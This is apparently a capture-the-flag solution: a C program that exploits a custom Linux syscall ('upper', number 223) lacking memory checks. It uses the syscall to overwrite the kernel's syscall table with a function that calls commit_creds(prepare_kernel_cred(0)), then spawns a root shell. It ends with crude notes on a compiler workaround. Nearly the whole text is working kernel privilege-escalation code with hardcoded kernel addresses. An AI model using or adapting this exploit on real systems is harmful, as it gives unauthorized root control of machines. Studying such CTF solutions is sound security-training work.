

```
#include <unistd.h>
#include<string.h>
#include <sys/syscall.h>
#define commit_creds 0x8003f56c
#define prepare_kernel_cred 0x8003f924 
#define sys_call_table 0x8000e348 
#define SYS_upper 223
#include <stdio.h>
long hooked_syscall(){
    unsigned long (*cred_commit_func)(unsigned long) = commit_creds ; 
    unsigned long (*prepare_kernel_cred_func)(unsigned long) = prepare_kernel_cred ; 
    cred_commit_func(prepare_kernel_cred_func(0));
	return 0; 
}

int main(){
    const char  message []  = "pwn_to_own @IDHM\n" ; 
    char message2[20] ; 
    syscall(SYS_write , 1 ,message  ,strlen(message) );
    //test of the original use of the  syscall
    syscall(SYS_upper , message , message2); 
    syscall(SYS_write , 1 ,message2  ,strlen(message) );
    // hook the syscall table : because there is no write or read protection in
    // the new syscal 
    printf(" hooked syscall :: %p\n", hooked_syscall);
    fflush(stdout); 
    void * func[2] = {hooked_syscall , NULL } ; 
    syscall(SYS_upper , func  , ((void *)sys_call_table) + SYS_upper * sizeof(void *));
    syscall(SYS_upper) ; 
    syscall(SYS_write , 1 ,message2  ,strlen(message) );
    system("/bin/sh");
    return 0;
}   


``` 

compile with that shitty thing : https://gcc.gnu.org/legacy-ml/gcc-help/2010-02/msg00212.html 
cause of shitty strcpy like function that stops on zero I coulnt stay in the normal address so I had !!! to use that shitty thing !!! 
![picture 0](../images/c5514d4da189da69a8cff666642084ae46baa5d9c904afa161b6874d040a545d.png)  
